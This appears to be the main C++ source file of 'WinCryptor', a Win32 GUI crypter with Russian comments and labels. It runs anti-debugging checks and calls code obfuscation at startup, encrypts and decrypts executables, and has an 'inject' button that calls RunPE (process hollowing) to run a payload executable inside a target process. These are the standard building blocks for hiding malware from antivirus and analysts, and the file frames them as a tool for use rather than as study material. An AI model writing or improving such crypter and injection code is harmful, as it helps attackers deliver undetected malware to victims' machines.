#include <windows.h>
#include <commdlg.h>
#include <commctrl.h>
#include "resource.h"
#include "crypt.h"
#include "anti_debug.h"
#include "runpe.h"

// Глобальные переменные
HINSTANCE g_hInst;
WinCryptor* g_pCryptor = nullptr;

// Прототипы функций
LRESULT CALLBACK MainWindowProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
void OnSelectFile(HWND hDlg, int editControlId, bool isOutput = false);
void OnEncrypt(HWND hDlg);
void OnDecrypt(HWND hDlg);
void OnInject(HWND hDlg);
void UpdateStatus(HWND hDlg, const std::wstring& message);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int) {
    // Антидебаг проверка
    if (AntiDebug::DetectDebugEnvironment()) {
        MessageBoxW(NULL, L"Обнаружена отладочная среда!", L"Предупреждение", MB_OK | MB_ICONWARNING);
        return -1;
    }
    
    // Применяем защиту от дизассемблирования
    AntiDebug::ObfuscateCode();
    
    g_hInst = hInstance;
    g_pCryptor = new WinCryptor();
    
    // Инициализация общих элементов управления
    InitCommonControls();
    
    int result = DialogBoxW(hInstance, MAKEINTRESOURCEW(IDD_MAIN_DIALOG), NULL, MainWindowProc);
    
    delete g_pCryptor;
    return result;
}

LRESULT CALLBACK MainWindowProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG:
        SetWindowTextW(hDlg, L"WinCryptor - Улучшенная версия");
        UpdateStatus(hDlg, L"Готов к работе");
        return TRUE;
        
    case WM_COMMAND:
        switch (LOWORD(wParam)) {
        case IDC_BROWSE_INPUT:
            OnSelectFile(hDlg, IDC_INPUT_FILE, false);
            break;
        case IDC_BROWSE_OUTPUT:
            OnSelectFile(hDlg, IDC_OUTPUT_FILE, true);
            break;
        case IDC_ENCRYPT:
            OnEncrypt(hDlg);
            break;
        case IDC_DECRYPT:
            OnDecrypt(hDlg);
            break;
        case IDC_INJECT:
            OnInject(hDlg);
            break;
        case IDCANCEL:
            EndDialog(hDlg, 0);
            break;
        }
        break;
        
    case WM_CLOSE:
        EndDialog(hDlg, 0);
        break;
    }
    return FALSE;
}

void OnSelectFile(HWND hDlg, int editControlId, bool isOutput) {
    OPENFILENAMEW ofn = {};
    wchar_t fileName[MAX_PATH] = L"";
    
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hDlg;
    ofn.lpstrFile = fileName;
    ofn.nMaxFile = MAX_PATH;
    
    if (isOutput) {
        ofn.lpstrTitle = L"Сохранить файл как";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_OVERWRITEPROMPT;
        ofn.lpstrFilter = L"Все файлы\0*.*\0";
        
        if (GetSaveFileNameW(&ofn)) {
            SetDlgItemTextW(hDlg, editControlId, fileName);
        }
    } else {
        ofn.lpstrTitle = L"Выберите файл";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
        ofn.lpstrFilter = L"Исполняемые файлы\0*.exe\0Все файлы\0*.*\0";
        
        if (GetOpenFileNameW(&ofn)) {
            SetDlgItemTextW(hDlg, editControlId, fileName);
        }
    }
}

void OnEncrypt(HWND hDlg) {
    wchar_t inputFile[MAX_PATH], outputFile[MAX_PATH], key[256];
    
    GetDlgItemTextW(hDlg, IDC_INPUT_FILE, inputFile, MAX_PATH);
    GetDlgItemTextW(hDlg, IDC_OUTPUT_FILE, outputFile, MAX_PATH);
    GetDlgItemTextW(hDlg, IDC_KEY, key, 256);
    
    if (wcslen(inputFile) == 0 || wcslen(outputFile) == 0 || wcslen(key) == 0) {
        UpdateStatus(hDlg, L"Заполните все поля!");
        return;
    }
    
    // Конвертируем ключ в std::string
    char keyStr[256];
    WideCharToMultiByte(CP_UTF8, 0, key, -1, keyStr, 256, NULL, NULL);
    
    UpdateStatus(hDlg, L"Шифрование...");
    
    if (g_pCryptor->EncryptFile(inputFile, outputFile, keyStr)) {
        UpdateStatus(hDlg, L"Шифрование завершено успешно!");
    } else {
        UpdateStatus(hDlg, L"Ошибка шифрования: " + g_pCryptor->GetLastError());
    }
}

void OnDecrypt(HWND hDlg) {
    wchar_t inputFile[MAX_PATH], outputFile[MAX_PATH], key[256];
    
    GetDlgItemTextW(hDlg, IDC_INPUT_FILE, inputFile, MAX_PATH);
    GetDlgItemTextW(hDlg, IDC_OUTPUT_FILE, outputFile, MAX_PATH);
    GetDlgItemTextW(hDlg, IDC_KEY, key, 256);
    
    if (wcslen(inputFile) == 0 || wcslen(outputFile) == 0 || wcslen(key) == 0) {
        UpdateStatus(hDlg, L"Заполните все поля!");
        return;
    }
    
    // Конвертируем ключ в std::string
    char keyStr[256];
    WideCharToMultiByte(CP_UTF8, 0, key, -1, keyStr, 256, NULL, NULL);
    
    UpdateStatus(hDlg, L"Расшифровка...");
    
    if (g_pCryptor->DecryptFile(inputFile, outputFile, keyStr)) {
        UpdateStatus(hDlg, L"Расшифровка завершена успешно!");
    } else {
        UpdateStatus(hDlg, L"Ошибка расшифровки: " + g_pCryptor->GetLastError());
    }
}

void OnInject(HWND hDlg) {
    wchar_t targetPath[MAX_PATH], payloadPath[MAX_PATH];
    
    GetDlgItemTextW(hDlg, IDC_INPUT_FILE, payloadPath, MAX_PATH);
    GetDlgItemTextW(hDlg, IDC_OUTPUT_FILE, targetPath, MAX_PATH);
    
    if (wcslen(targetPath) == 0 || wcslen(payloadPath) == 0) {
        UpdateStatus(hDlg, L"Заполните поля входного и выходного файлов!");
        return;
    }
    
    UpdateStatus(hDlg, L"Инъекция в процесс...");
    g_pCryptor->LogMessage(L"Начало инъекции процесса: " + std::wstring(payloadPath));
    
    std::wstring error;
    if (RunPE(targetPath, payloadPath, &error)) {
        UpdateStatus(hDlg, L"Инъекция завершена успешно!");
        g_pCryptor->LogMessage(L"Инъекция завершена успешно");
    } else {
        UpdateStatus(hDlg, L"Ошибка инъекции: " + error);
        g_pCryptor->LogMessage(L"Ошибка инъекции: " + error);
    }
}

void UpdateStatus(HWND hDlg, const std::wstring& message) {
    SetDlgItemTextW(hDlg, IDC_STATUS, message.c_str());
}